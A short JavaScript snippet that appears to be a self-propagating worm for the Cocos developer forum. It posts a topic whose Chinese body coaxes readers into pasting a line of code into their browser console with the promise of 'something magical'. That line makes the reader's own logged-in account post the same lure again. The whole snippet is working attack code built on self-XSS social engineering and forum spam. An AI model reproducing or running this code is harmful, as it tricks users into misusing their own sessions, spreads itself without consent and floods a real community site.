let data = JSON.parse(`{"method":"POST","data":{"raw":"","title":"教你个神奇好玩的事情","category":27,"is_warning":false,"archetype":"regular","typing_duration_msecs":3500,"composer_open_duration_msecs":37980,"image_sizes":{},"nested_post":true},"headers":{},"type":"GET","dataType":"json","cache":false}`)
data.data.raw = String.raw`### 第一步：打开下方链接，复制内容
$.ajax('https://forum.cocos.org/posts',JSON.parse('{"method":"POST","data":{"raw":"","title":"教你个神奇好玩的事情","category":27,"is_warning":false,"archetype":"regular","typing_duration_msecs":3500,"composer_open_duration_msecs":37980,"image_sizes":{},"nested_post":true},"headers":{},"type":"GET","dataType":"json","cache":false}'))

### 第二步：回到论坛，右键审查元素（或按F12），打开浏览器控制台，在console中粘贴
### 第三步：回车

### 你会发现神奇的事情发生了。。。`
$.ajax('https://forum.cocos.org/posts',data)
